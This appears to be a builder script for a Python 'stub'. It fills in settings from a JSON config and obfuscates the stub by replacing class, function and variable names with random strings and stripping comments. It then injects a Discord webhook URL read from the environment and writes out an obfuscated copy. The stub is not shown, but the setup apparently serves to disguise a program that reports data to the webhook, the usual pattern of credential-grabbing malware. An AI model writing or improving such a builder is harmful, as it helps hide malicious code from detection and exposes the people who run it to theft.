import re
import random
import os
import json

def getRandomString() -> str:
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k= 5))

with open('stub.py') as in_file:

    file_contents = in_file.read()
    obf = file_contents
    
    config = dict()
    with open('config.json') as config_file:
        config = json.load(config_file)
    
    for setting in config:
        obf = re.sub("\""+setting+"\"", str(config[setting]), obf)

    for class_reference in re.finditer(r"class ([a-zA-Z]+):", obf):
        if class_reference.group(1) not in  ["Queso"]:
            obf = re.sub(class_reference.group(1), getRandomString(), obf)

    for function_reference in re.finditer(r"def ([a-zA-Z]+)\(.*\)( -> .*)?:", obf):
        obf = re.sub(function_reference.group(1), getRandomString(), obf)
        if function_reference.group(2):
            obf = re.sub(function_reference.group(2), "", obf)

    for variable_reference in re.finditer(r"([a-zA-Z_]+)(: [a-zA-Z\[\]]+)? =", obf):
        if variable_reference.group(1) not in ["Queso", "name", "stdout", "stderr", "returncode"]:
            obf = re.sub(variable_reference.group(1), getRandomString(), obf)
            if variable_reference.group(2):
                obf = re.sub(variable_reference.group(2), "", obf)

    for variable_reference in re.finditer(r"for ([a-zA-Z_]+)(, ([a-zA-Z_]+))? in", obf):
        obf = re.sub(variable_reference.group(1), getRandomString(), obf)
        if variable_reference.group(2):
            obf = re.sub(variable_reference.group(3), getRandomString(), obf)

    for variable_reference in re.finditer(r"as ([a-zA-Z_]+):", obf):
        obf = re.sub(variable_reference.group(1), getRandomString(), obf)

    obf = re.sub(r"#.*\n", "\n", obf)

    obf = obf.replace("%webhook%", os.getenv("DISCORD_WEBHOOK"))
    
    with open('stub.o.py', "w") as out_file:
        out_file.write(obf)